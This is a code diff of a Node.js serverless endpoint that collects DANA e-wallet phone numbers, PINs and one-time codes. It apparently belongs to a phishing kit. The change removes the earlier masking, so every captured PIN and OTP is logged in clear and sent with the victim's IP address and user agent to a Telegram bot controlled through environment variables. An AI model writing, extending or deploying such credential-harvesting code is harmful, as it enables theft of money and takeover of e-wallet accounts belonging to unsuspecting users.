@@ -1,119 +1,84 @@
 // api/send-dana-data.js
 const axios = require('axios');
 
-// Fungsi untuk mengirim data ke webhook (opsional)
-async function sendToWebhook(data) {
-  if (!process.env.WEBHOOK_URL) {
-    console.log('WEBHOOK_URL not set, skipping webhook notification');
-    return;
-  }
-
-  try {
-    const payload = {
-      type: data.type,
-      phone: data.phone,
-      // Sensitive data hanya dikirim sebagian untuk keamanan
-      pin: data.type === 'pin' ? '******' : 'not_provided',
-      otp: data.type === 'otp' ? '****' : 'not_provided',
-      timestamp: new Date().toISOString(),
-      userAgent: data.userAgent || 'unknown'
-    };
-
-    await axios.post(process.env.WEBHOOK_URL, payload);
-    console.log('Data sent to webhook successfully');
-  } catch (error) {
-    console.error('Error sending to webhook:', error.message);
-  }
-}
-
-// Fungsi untuk mengirim notifikasi ke Telegram dengan format khusus
+// Fungsi untuk mengirim notifikasi ke Telegram dengan data lengkap
 async function sendToTelegram(data) {
-  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
-    console.log('Telegram credentials not set, skipping notification');
-    return;
+  // Gunakan environment variables dari Vercel
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (!botToken || !chatId) {
+    console.log('Telegram credentials not set in environment variables');
+    console.log('TELEGRAM_BOT_TOKEN:', botToken ? 'Set' : 'Not Set');
+    console.log('TELEGRAM_CHAT_ID:', chatId ? 'Set' : 'Not Set');
+    return false;
   }
 
   try {
     let message = '';
     
-    // Format notifikasi berdasarkan type
+    // Format notifikasi berdasarkan type - TANPA SENSOR
     if (data.type === 'phone') {
-      message = `🔔 New DANA notifikasi heck\n\n` +
+      message = `🔔 New DANA Registration\n\n` +
                 `├───────────────────\n` +
                 `├• NO HP : ${data.phone}\n` +
+                `├• IP Address : ${data.ip || 'Unknown'}\n` +
+                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
+                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                 `╰───────────────────`;
     } 
     else if (data.type === 'pin') {
-      message = `🔔 New DANA Verification\n\n` +
+      message = `🔔 New DANA PIN Verification\n\n` +
                 `├───────────────────\n` +
                 `├• NO HP : ${data.phone}\n` +
-                `├───────────────────\n` +
-                `├• PIN  : ${data.pin}\n` +
+                `├• PIN : ${data.pin}\n` +
+                `├• IP Address : ${data.ip || 'Unknown'}\n` +
+                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
+                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                 `╰───────────────────`;
     }
     else if (data.type === 'otp') {
-      message = `🔔 New DANA Verification\n\n` +
+      message = `🔔 New DANA OTP Verification\n\n` +
                 `├───────────────────\n` +
                 `├• NO HP : ${data.phone}\n` +
-                `├───────────────────\n` +
-                `├• PIN  : ${data.pin}\n` +
-                `├───────────────────\n` +
+                `├• PIN : ${data.pin}\n` +
                 `├• OTP : ${data.otp}\n` +
+                `├• IP Address : ${data.ip || 'Unknown'}\n` +
+                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
+                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                 `╰───────────────────`;
     } else {
-      // Format default untuk type lainnya
       message = `🔔 New DANA Verification\n\n` +
                 `├───────────────────\n` +
                 `├• Type: ${data.type}\n` +
                 `├• NO HP : ${data.phone || 'N/A'}\n` +
+                `├• IP Address : ${data.ip || 'Unknown'}\n` +
+                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                 `╰───────────────────`;
     }
 
-    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     
-    await axios.post(url, {
-      chat_id: process.env.TELEGRAM_CHAT_ID,
+    console.log('Sending to Telegram with full data');
+    
+    const response = await axios.post(url, {
+      chat_id: chatId,
       text: message,
-      parse_mode: null // Tidak menggunakan Markdown untuk format khusus
+      parse_mode: null
     });
     
-    console.log('Notification sent to Telegram successfully');
+    console.log('Telegram notification sent successfully');
+    return true;
   } catch (error) {
     console.error('Error sending to Telegram:', error.message);
+    if (error.response) {
+      console.error('Telegram API response:', error.response.data);
+    }
+    return false;
   }
 }
 
-// Fungsi untuk mengirim notifikasi email (opsional)
-async function sendEmailNotification(data) {
-  if (!process.env.EMAIL_API_KEY) {
-    return; // Skip jika tidak ada konfigurasi email
-  }
-
-  try {
-    // Implementasi pengiriman email sesuai provider yang Anda gunakan
-    // Contoh menggunakan SendGrid, Nodemailer, dll.
-    console.log('Email notification would be sent for:', {
-      type: data.type,
-      phone: data.phone,
-      timestamp: new Date().toISOString()
-    });
-  } catch (error) {
-    console.error('Error sending email:', error.message);
-  }
-}
-
-// Fungsi untuk menyimpan data ke database (opsional)
-async function saveToDatabase(data) {
-  // Implementasi penyimpanan database sesuai kebutuhan
-  // Bisa menggunakan MongoDB, PostgreSQL, Firebase, dll.
-  console.log('Data would be saved to database:', {
-    type: data.type,
-    phone: data.phone,
-    timestamp: new Date().toISOString()
-  });
-}
-
-// Main function
+// Main function - Hanya kirim ke Telegram, tidak ke tempat lain
 module.exports = async (req, res) => {
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -162,21 +127,20 @@ module.exports = async (req, res) => {
       });
     }
 
-    // Log data yang diterima (disensor untuk keamanan)
-    console.log('📩 Data received:', { 
+    // Log data yang diterima (TANPA SENSOR untuk keperluan debugging)
+    console.log('📩 Full data received:', { 
       type, 
-      phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
-      hasPin: !!pin,
-      hasOtp: !!otp,
+      phone: phone || 'not_provided',
+      pin: pin || 'not_provided', 
+      otp: otp || 'not_provided',
       timestamp: new Date().toISOString(),
-      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+      userAgent: req.headers['user-agent'] || 'unknown'
     });
 
-    // Simulasi processing time (1-2 detik)
-    const processingTime = Math.random() * 1000 + 1000;
-    await new Promise(resolve => setTimeout(resolve, processingTime));
-
     // Proses data berdasarkan type
+    let telegramResult = false;
+    
     switch (type) {
       case 'phone':
         if (!phone || phone.length < 10) {
@@ -187,7 +151,7 @@ module.exports = async (req, res) => {
         }
         
         // Kirim notifikasi ke Telegram untuk phone
-        await sendToTelegram({
+        telegramResult = await sendToTelegram({
           type: 'phone',
           phone: phone,
           userAgent: req.headers['user-agent'],
@@ -204,7 +168,7 @@ module.exports = async (req, res) => {
         }
         
         // Kirim notifikasi ke Telegram untuk pin
-        await sendToTelegram({
+        telegramResult = await sendToTelegram({
           type: 'pin',
           phone: phone,
           pin: pin,
@@ -222,7 +186,7 @@ module.exports = async (req, res) => {
         }
         
         // Kirim notifikasi ke Telegram untuk otp
-        await sendToTelegram({
+        telegramResult = await sendToTelegram({
           type: 'otp',
           phone: phone,
           pin: pin,
@@ -239,52 +203,15 @@ module.exports = async (req, res) => {
         });
     }
 
-    // Kirim notifikasi ke webhook (opsional)
-    try {
-      await sendToWebhook({
-        type,
-        phone,
-        pin,
-        otp,
-        userAgent: req.headers['user-agent'],
-        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
-      });
-    } catch (webhookError) {
-      console.error('Webhook error:', webhookError.message);
-      // Jangan gagalkan seluruh request karena error webhook
-    }
-
-    // Simpan ke database (opsional)
-    try {
-      await saveToDatabase({
-        type,
-        phone,
-        timestamp: new Date().toISOString()
-      });
-    } catch (dbError) {
-      console.error('Database error:', dbError.message);
-      // Jangan gagalkan seluruh request karena error database
-    }
-
-    // Kirim notifikasi email (opsional)
-    try {
-      await sendEmailNotification({
-        type,
-        phone,
-        timestamp: new Date().toISOString()
-      });
-    } catch (emailError) {
-      console.error('Email error:', emailError.message);
-      // Jangan gagalkan seluruh request karena error email
-    }
+    console.log('Telegram notification result:', telegramResult ? 'Success' : 'Failed');
 
     // Response sukses
     return res.status(200).json({ 
       success: true, 
       message: 'Data processed successfully',
+      telegramSent: telegramResult,
       data: {
         type,
-        phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
         timestamp: new Date().toISOString()
       }
     });
